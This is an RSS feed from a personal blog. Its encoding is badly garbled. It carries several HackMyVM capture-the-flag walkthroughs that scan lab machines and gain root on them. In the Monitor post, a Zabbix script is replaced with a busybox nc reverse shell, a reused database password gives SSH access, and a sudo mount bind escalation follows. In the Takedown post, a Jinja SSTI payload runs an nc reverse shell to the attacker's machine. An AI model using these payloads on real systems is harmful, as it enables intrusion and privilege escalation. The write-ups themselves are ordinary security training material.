<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>èæ°´ç›¸é€¢ï¼Œæ°ä¼¼æ¸©æŸ”~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Sat, 20 Dec 2025 09:55:57 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>hackmyvm Thirteenæµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20Thirteen-ce-shi-ji-lu.html</link><description>
### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Thirteen
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼Œ`rot13`ï¼Œ`ftp`ï¼Œ`cupp`å·¥å…·ï¼Œ`hydra`çˆ†ç ´ï¼Œ`ss`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.8    08:00:27:c0:05:39       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.8
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 12:58 CST
Nmap scan report for 13max (192.168.31.8)
Host is up (0.0019s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 2.0.1
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.31.8:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: iCloud Vault Access
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:C0:05:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`21ã€22ã€80`ç«¯å£,å…ˆå¸¸è§„æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[13:00:08] 200 -  284B  - /config.txt
[13:00:12] 301 -  311B  - /logs  -&gt;  http://192.168.31.8/logs/
[13:00:16] 200 -   97B  - /readme.txt
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/logs/ -x.txt,.log,.php,.html,.bak
=================
/ftp_server.log       (Status: 200) [Size: 12507]
```

å‘ç°`/logs/ftp_server.log`ï¼Œè®¿é—®æ˜¯`ftp`è¿è¡Œæ—¥å¿—

##### `rot13`åŠ å¯†

![image-20250810130050116](https://gitee.com/shui666/images/raw/master/images/image-20250810130050116.png)

ç›´æ¥è®¿é—®`80`ç«¯å£ï¼Œé¡µé¢é¢„ç•™äº†`Welcome Listã€Sync Configã€Help Manual`ä¸‰ä¸ªæ ‡ç­¾ï¼Œç‚¹å‡»åè·³è½¬`/?theme=jrypbzr.gkgã€/?theme=pbasvt.gkgã€/?theme=ernqzr.gkg`ï¼Œå‘ç°å¯é€šè¿‡ `?theme=` å‚æ•°æŒ‡å®šè¦è®¿é—®çš„æ–‡ä»¶ï¼Œå‚æ•°å€¼åº”ä¸º`rot13`åŠ å¯†çš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚welcome .txt-&gt;rot13-&gt; `jrypbzr.gkg`ï¼‰ï¼Œå³è¾“å…¥æ¡†å…è®¸ç”¨æˆ·é€šè¿‡è¾“å…¥`rot13`åŠ å¯†è·¯å¾„å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Thirteen-ce-shi-ji-lu.html</guid><pubDate>Sun, 10 Aug 2025 14:20:01 +0000</pubDate></item><item><title>ç¾¤å‹é¶æœºï¼š Monitor 20250810</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A%20Monitor%2020250810.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼Œ`zabbix`,`mount`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.173  08:00:27:6e:98:21       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.173
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 15:10 CST
Nmap scan report for Monitor (192.168.31.173)
Host is up (0.0015s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: \xE7\x9B\x91\xE6\x8E\xA7\xE7\xB3\xBB\xE7\xBB\x9F\xE7\x99\xBB\xE5\xBD\x95
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34153/udp   mountd
|   100005  1,2,3      36123/tcp6  mountd
|   100005  1,2,3      39525/udp6  mountd
|   100005  1,2,3      59255/tcp   mountd
|   100021  1,3,4      36401/tcp6  nlockmgr
|   100021  1,3,4      36810/udp   nlockmgr
|   100021  1,3,4      41238/udp6  nlockmgr
|   100021  1,3,4      45199/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
MAC Address: 08:00:27:6E:98:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80ã€RPC`ç«¯å£,æ²¡rpcåˆ©ç”¨å·¥å…·ï¼Œå…ˆå¸¸è§„æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[15:12:43] 302 -    0B  - /dashboard.php  -&gt;  index.php
[15:12:47] 302 -    0B  - /logout.php  -&gt;  index.php
[15:12:55] 301 -  317B  - /upload  -&gt;  http://192.168.31.173/upload/
[15:12:55] 200 -  407B  - /upload/
[15:12:57] 200 -    1KB - /zabbix/
â””â”€# dirsearch -u http://$IP/zabbix/  -x 403 -e txt,php,html
[15:38:01] Starting: zabbix/
[15:38:07] 301 -  324B  - /zabbix/assets  -&gt;  http://192.168.31.173/zabbix/assets/
[15:38:08] 301 -  323B  - /zabbix/audio  -&gt;  http://192.168.31.173/zabbix/audio/
[15:38:09] 200 -  227B  - /zabbix/composer.json
[15:38:09] 200 -    8KB - /zabbix/composer.lock
[15:38:10] 301 -  322B  - /zabbix/data  -&gt;  http://192.168.31.173/zabbix/data/
[15:38:11] 200 -   32KB - /zabbix/favicon.ico
[15:38:11] 301 -  323B  - /zabbix/fonts  -&gt;  http://192.168.31.173/zabbix/fonts/
[15:38:12] 200 -  819B  - /zabbix/image.php
[15:38:13] 301 -  320B  - /zabbix/js  -&gt;  http://192.168.31.173/zabbix/js/
[15:38:14] 200 -  823B  - /zabbix/maintenance.php
[15:38:14] 200 -  819B  - /zabbix/map.php
[15:38:15] 301 -  325B  - /zabbix/modules  -&gt;  http://192.168.31.173/zabbix/modules/
[15:38:18] 200 -  514B  - /zabbix/robots.txt
[15:38:18] 200 -  822B  - /zabbix/setup.php
[15:38:23] 200 -  849B  - /zabbix/zabbix.php?action=dashboard.view&amp;dashboardid=1
```

â€‹    è®¿é—®å­ç›®å½•`zabbix`ï¼Œæœ‰ä¸ªç™»é™†é¡µé¢`/zabbix/index.php`ï¼Œé¡ºæ‰‹æœç´¢`Zabbix`çš„é»˜è®¤è´¦å·ä¸ºâ€œ`Admin`â€ï¼Œå¯†ç ä¸ºâ€œ`zabbix`â€ï¼Œä½¿ç”¨é»˜è®¤å¯†ç æˆåŠŸç™»å½•ç®¡ç†åå°ï¼Œæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯`Zabbix 6.0.40`

### 3.è·å¾—`zabbix`æƒé™

ç™»å½•ååœ¨é¡µé¢çš„`Administration`--&gt; `Scripts`å‘ç°å¯ä»¥æ·»åŠ è„šæœ¬ï¼Œ æ²¡çœ‹åˆ°æ–°å¢ï¼Œå°†ç°æœ‰çš„`ping`è„šæœ¬å†…å®¹ä¿®æ”¹ä¸ºåå¼¹`shell`å†…å®¹

```shell
#http://192.168.31.173/zabbix/zabbix.php?action=script.edit&amp;scriptid=1
#ping_bak
ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac
#ä¿®æ”¹ä¸º
busybox nc 192.168.31.126 1234 -e /bin/bash
```

![image-20250810181100999](https://gitee.com/shui666/images/raw/master/images/image-20250810181100999.png)

æ›´æ–°è„šæœ¬å†…å®¹åï¼Œå†å»`Monitoring`--&gt; `Maps`ä½ç½®ç‚¹å‡»ä¸»æœºåæ‰§è¡Œåå¼¹shellå‘½ä»¤ï¼Œå³å¯è·å¾—`zabbix`çš„shell

```
â””â”€# nc -lvp 1234
listening on [any] 1234 ...
id
192.168.31.173: inverse host lookup failed: Host name lookup failure
connect to [192.168.31.126] from (UNKNOWN) [192.168.31.173] 57834
uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
```

![image-20250810181344289](https://gitee.com/shui666/images/raw/master/images/image-20250810181344289.png)

å¯ç™»å½•è´¦æˆ·æœ‰`hyh`ï¼Œæ­¤æ—¶å¯ä»¥è¯»å–`user.txt`,æ³¨æ„æ­¤æ—¶`shell`è¿‡å‡ åˆ†é’Ÿå°±ä¼šæ–­,èµ¶ç´§æ”¶é›†ä¿¡æ¯ä¸‹ä¸€æ­¥

```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
.....
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
zabbix:x:107:114::/var/lib/zabbix/:/usr/sbin/nologin
Debian-snmp:x:108:115::/var/lib/snmp:/bin/false
hyh:x:1000:1000:,,,:/home/hyh:/bin/bash
_rpc:x:109:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
```

##### æ‹¿åˆ°`user.txt`

```shell
zabbix@Monitor:/home/hyh$ ls
user.txt
zabbix@Monitor:/home/hyh$ cat user.txt
flag{user-ab0e0561b1a833a6141ad2273744543c}
zabbix@Monitor:/home/hyh$ id
uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
```

### 4.è·å¾—`hyh`æƒé™

æŸ¥çœ‹`hyh`ç”¨æˆ·å’Œæ•°ç»„ç›¸å…³æ–‡ä»¶æ²¡å‘ç°æœ‰ä»·å€¼ä¿¡æ¯ï¼Œå…ˆä¼ ä¸ª`linpeas.sh`è„šæœ¬æ‰«ä¸€ä¸‹

```shell
zabbix@Monitor:/tmp$ busybox wget 192.168.31.126/linpeas.sh
Connecting to 192.168.31.126 (192.168.31.126:80)
linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
zabbix@Monitor:/tmp$ bash linpeas.sh
```

æ‰¾åˆ°äº†`zabbix`é…ç½®æ–‡ä»¶`zabbix.conf`ï¼Œé‡Œé¢æœ‰æ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯

```shell
zabbix@Monitor:/$ cat /etc/zabbix/web/zabbix.conf.php
&lt;?php
// Zabbix GUI configuration file.

$DB['TYPE']                             = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['PORT']                             = '0';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                             = 'zabbix';
$DB['PASSWORD']                 = 'root123';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']                   = '';

// Used for TLS connection.
$DB['ENCRYPTION']               = false;
$DB['KEY_FILE']                 = '';
$DB['CERT_FILE']                = '';
$DB['CA_FILE']                  = '';
$DB['VERIFY_HOST']              = false;
$DB['CIPHER_LIST']              = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT_URL']                = '';
$DB['VAULT_DB_PATH']    = '';
$DB['VAULT_TOKEN']              = '';

// Use IEEE754 compatible value range for 64-bit Numeric (float) history values.
// This option is enabled by default for new Zabbix installations.
// For upgraded installations, please read database upgrade notes before enabling this option.
$DB['DOUBLE_IEEE754']   = true;

// Uncomment and set to desired values to override Zabbix hostname/IP and port.
// $ZBX_SERVER                  = '';
// $ZBX_SERVER_PORT             = '';

$ZBX_SERVER_NAME                = 'Zabbix';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;

// Uncomment this block only if you are using Elasticsearch.
// Elasticsearch url (can be string if same url is used for all types).
//$HISTORY['url'] = [
//      'uint' =&gt; 'http://localhost:9200',
//      'text' =&gt; 'http://localhost:9200'
//];
// Value types stored in Elasticsearch.
//$HISTORY['types'] = ['uint', 'text'];

// Used for SAML authentication.
// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
//$SSO['SP_KEY']                        = 'conf/certs/sp.key';
//$SSO['SP_CERT']                       = 'conf/certs/sp.crt';
//$SSO['IDP_CERT']              = 'conf/certs/idp.crt';
//$SSO['SETTINGS']              = [];
zabbix@Monitor:/$
```

æœ¬æœºèµ·äº†`mysql`ï¼Œæ—¢ç„¶æœ‰æ•°æ®è´¦æˆ·å¯†ç ï¼Œå…ˆç™»é™†æ•°æ®åº“æŸ¥ä¸€ä¸‹ï¼Œ`users`è¡¨ä¸­åªæœ‰`Admin`å’Œ`guest`çš„è´¦æˆ·ä¿¡æ¯

```shell
zabbix@Monitor:/$ mysql -u zabbix -proot123 -D zabbix
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2131
Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]&gt; show tables;
+----------------------------+
| Tables_in_zabbix           |
+----------------------------+
......
| triggers                   |
| users                      |
| users_groups               |
| usrgrp                     |
| valuemap                   |
| valuemap_mapping           |
| widget                     |
| widget_field               |
+----------------------------+
173 rows in set (0.001 sec)

MariaDB [zabbix]&gt; select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$92nDno4n0Zm7Ej7Jfsz8WukBfgSS/U0QkIuu8WkJPihXBb2A1UrEK |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
2 rows in set (0.001 sec)

MariaDB [zabbix]&gt;
```

ç–‘æƒ‘ä¹‹é™…ï¼Œæµ‹è¯•`hyh`çš„å¯†ç å°±æ˜¯æ•°æ®åº“çš„å¯†ç `root123`

```shell
â””â”€# ssh hyh@$IP
#root123
hyh@Monitor:~$ id
uid=1000(hyh) gid=1000(hyh) groups=1000(hyh)
```

### 5.è·å¾—`root`æƒé™

æµ‹è¯•`sudo -l`,å¯ä»¥`root`æƒé™æ‰§è¡Œ`mount`

```shell
hyh@Monitor:~$ sudo -l
Matching Defaults entries for hyh on Monitor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hyh may run the following commands on Monitor:
    (ALL) NOPASSWD: /usr/bin/mount
```

##### `mount`ææƒ

æŸ¥è¡¨ï¼Œ`mount`æœ‰ç°æˆçš„ææƒæ–¹æ¡ˆ

```shell
#`mount`ææƒ
sudo mount -o bind /bin/sh /bin/mount
sudo mount
```

##### æ‹¿åˆ°`root.txt`

```shell
hyh@Monitor:~$ sudo /usr/bin/mount  -o bind /bin/sh /bin/mount
/usr/bin/mount: 0: Illegal option -o bind
hyh@Monitor:~$ sudo mount
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
flag{root-deb15d884e04de6f6972b3c25e3cc11b}
# cat /home/hyh/user.txt
flag{user-ab0e0561b1a833a6141ad2273744543c}
```


ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A%20Monitor%2020250810.html</guid><pubDate>Sun, 10 Aug 2025 14:10:25 +0000</pubDate></item><item><title>hackmyvm Takedownæµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20Takedown-ce-shi-ji-lu.html</link><description>
### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Takedown
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼ŒSSTIï¼Œ`linpeas.sh`è„šæœ¬ï¼Œ`RSA`å·¥å…·åŠå¯†é’¥å¤„ç†è„šæœ¬ï¼Œ`Contempt`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.116  08:00:27:b1:55:96       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.116
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 09:12 CST
Nmap scan report for osiris (192.168.31.116)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey:
|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
|_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://shieldweb.che/
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:B1:55:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80`ç«¯å£,å…ˆå¸¸è§„æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html

```

è®¿é—®`80`ç«¯å£æ— å†…å®¹ï¼Œç›´æ¥è®¿é—®æœ‰ä¸ª301è·³è½¬ `http://shieldweb.che/` ,åŠ å…¥åŸŸååˆ°`/etc/hosts`,è¿›å…¥é¡µé¢`http://shieldweb.che/`ï¼Œç‚¹å‡»`Contact`æŒ‰é’®åˆè·³è½¬äº†`http://ticket.shieldweb.che/`,ç»§ç»­åŠ å…¥åŸŸååˆ°`/etc/hosts`

```shell
â””â”€# curl  http://$IP -v
*   Trying 192.168.31.116:80...
* Connected to 192.168.31.116 (192.168.31.116) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.31.116
&gt; User-Agent: curl/8.11.0
&gt; Accept: */*
&gt;
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.18.0
&lt; Date: Sat, 09 Aug 2025 01:22:39 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 169
&lt; Connection: keep-alive
&lt; Location: http://shieldweb.che/
&lt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Connection #0 to host 192.168.31.116 left intact
â””â”€# cat /etc/hosts | grep .che
192.168.31.116  shieldweb.che ticket.shieldweb.che
```

### 3.è·å¾—`docker`æƒé™

æµ‹è¯•`Contact`é¡µé¢å­˜åœ¨`SSTI`æ¨¡æ¿æ³¨å…¥

![image-20250809101436919](https://gitee.com/shui666/images/raw/master/images/image-20250809101436919.png)

å»`github`æ‰¾ä¸ªç°æˆæ–¹æ¡ˆæµ‹è¯•`PayloadsAllTheThings
/Server Side Template Injection/Python.md`

```shell
#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) !
#æ³¨æ„ï¼Œæ²¡å¾—bashï¼Œç”¨ash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.31.126 1234 -e /bin/ash').read() }}
â””â”€# nc -lvp 1234
listening on [any] 1234 ...
id
connect to [192.168.31.126] from ticket.shieldweb.che [192.168.31.116] 52914
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

ç¾åŒ–ä¸€ä¸‹ç»ˆç«¯ï¼Œå—é™äº`doker`ç¯å¢ƒï¼Œè¿™é‡Œä½¿ç”¨`Python`çš„`pty`æ¨¡å—ç”Ÿæˆä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨ç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·`script`å‡çº§ç»ˆç«¯

```shell
#1.æŠŠåå¼¹shellå˜æˆäº¤äº’å¼ï¼Œåœ¨æ¥å—å›å¼¹çš„nc -lvp 4444ç»ˆç«¯ä¸Šæ‰§è¡Œ
python -c 'import pty; pty.spawn('/bin/ash')'
å…ˆctrl + Z ä¸­æ–­å†è¾“å…¥
#2.äº¤äº’å¼shellå˜æˆæ”¯æŒå›é€€å­—ç¬¦çš„shellï¼ˆæ”¯æŒæ§åˆ¶å­—ç¬¦ï¼‰
stty raw -echo;fg
#resetï¼Œè¿™ä¸€æ¡å¼„äº†å½“å‰ç»ˆç«¯åªèƒ½å¼ºåˆ¶å…³é—­
#xterm#æ ¹æ®é»˜è®¤xtermæŸ¥è¯¢ï¼Œå‘½ä»¤echo  $SHELLã€echo  $TERM
3.ç»ˆç«¯viå¯å…¨å±ç¼–è¾‘ï¼Œè§£å†³è¾“å…¥é—®é¢˜
stty -a#æŸ¥è¯¢å½“å‰å°ºå¯¸
stty rows 24 columns 120#æ ¹æ®ä¸Šé¢æŸ¥è¯¢ç»“æœï¼Œè®¾ç½®ä¸ºå½“å‰çª—å£å¤§å°
```



### 4.è·å¾—`love`æƒé™

æ²¡æ‰’æ‹‰åˆ°ä¸œè¥¿ï¼Œå…ˆå–ä¸ª`linpeas.sh`è„šæœ¬æ‰«ä¸€ä¸‹

```shell
kaliâ””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.31.116 - - [09/Aug/2025 10:48:03] 'GET /linpeas.sh HTTP/1.1' 200 -

/tmp # wget 192.168.31.126/linpeas.sh
Connecting to 192.168.31.126 (192.168.31.126:80)
linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
/tmp # chmod +x linpeas.sh
/tmp # ./linpeas.sh
```

é€šè¿‡`linpeas.sh`è„šæœ¬å‘ç°å¯ç–‘ç›®å½•æŒ‚è½½ï¼šå°†`/love/script`ç›®å½•æŒ‚è½½åˆ°äº†`/script`ï¼ˆçœ‹ç¾¤ä¸»çš„WPæ‰çŸ¥é“ï¼‰

```
â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting Files Mounted
239 231 0:23 /love/script /script rw,nosuid,nodev - tmpfs tmpfs rw
240 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
241 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
242 231 8:1 /home/alfonso/.local/share/docker/containers/45df5690b1c3614e3cd25bbb3d5c0fad58e549016c0bca12e3f421e3b1fc1c70/hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
244 233 0:5 /random /dev/random rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
245 233 0:5 /full /dev/full rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
246 233 0:5 /tty /dev/tty rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
247 233 0:5 /zero /dev/zero rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755
248 233 0:5 /urandom /dev/urandom rw,nosuid,relatime master:2 - devtmpfs udev rw,size=997456k,nr_inodes=249364,mode=755

```

ç»“åˆ`/var/log`ä¸‹`access.ymlã€chat`ä¸­å†…å®¹ï¼ŒçŸ¥é“æ¯`5åˆ†é’Ÿ`æ‰§è¡Œäº†`cron`ä»»åŠ¡ï¼Œä»»åŠ¡è·¯å¾„æ˜¯`/home/love/script`ï¼Œå‰é¢å·²çŸ¥`/love/script`ç›®å½•è¢«æŒ‚è½½åˆ°äº†`/script`ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Takedown-ce-shi-ji-lu.html</guid><pubDate>Sat, 09 Aug 2025 08:52:18 +0000</pubDate></item><item><title>ç¾¤å‹é¶æœºï¼šBase 20250723</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9ABase%2020250723.html</link><description>
### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼Œ`sqlite3`è¯»æ•°æ®åº“ï¼Œ`PivotX 3.0.0 RC3 RCE`,æ£€ç´¢ç³»ç»Ÿæ—¥å¿—
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.72   08:00:27:77:12:c7       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.72
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 19:16 CST
Nmap scan report for Base (192.168.31.72)
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
